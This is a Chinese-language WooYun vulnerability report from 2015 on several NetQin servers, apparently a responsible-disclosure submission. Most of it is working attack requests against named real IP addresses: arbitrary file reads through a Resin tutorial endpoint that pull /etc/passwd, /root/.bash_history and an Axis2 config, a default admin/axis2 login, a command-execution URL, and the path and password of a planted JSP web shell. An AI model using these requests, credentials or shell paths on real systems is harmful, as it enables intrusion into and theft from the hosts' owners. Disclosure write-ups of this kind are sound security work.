wybug_title: 网秦几个系统漏洞打包
wybug_detail:
漏洞详情 披露状态：   									2015-07-21：	细节已通知厂商并且等待厂商处理中									2015-07-22：	厂商已经确认，细节仅向厂商公开									2015-08-01：	细节向核心白帽子及相关领域专家公开									2015-08-11：	细节向普通白帽子公开									2015-08-21：	细节向实习白帽子公开									2015-09-05：	细节向公众公开  简要描述： 任意文件读取+其中一台服务器getshell 详细说明：  涉及到的ip有
http://211.151.59.14http://211.151.59.13http://211.151.59.27
http://211.151.59.14/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts

http://211.151.59.14/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd 

http://211.151.59.14/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bash_history

211.151.59.14该ip对应http://nqsms.netqin.com/http://211.151.59.13/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd

http://211.151.59.13/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts

http://211.151.59.13/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bash_history

   漏洞证明：  211.151.59.27该系统可以getshellhttp://211.151.59.27/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts

http://211.151.59.27/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd

http://211.151.59.27/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bash_history

在浏览root/.bash_history的时候，发现部署了Axis2，且存在弱口令（就算不是弱口令，密码也可读）
http://211.151.59.27/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/usr/local/resin-3.0.21/webapps/axis2/WEB-INF/conf/axis2.xml
admin/axis2登录http://211.151.59.27/axis2/axis2-admin/login

上传shell


http://211.151.59.27/axis2/services/Cat/exec?cmd=whoami


上传一句话http://211.151.59.27/axis2/wooyun.jsp密码：woo0yun
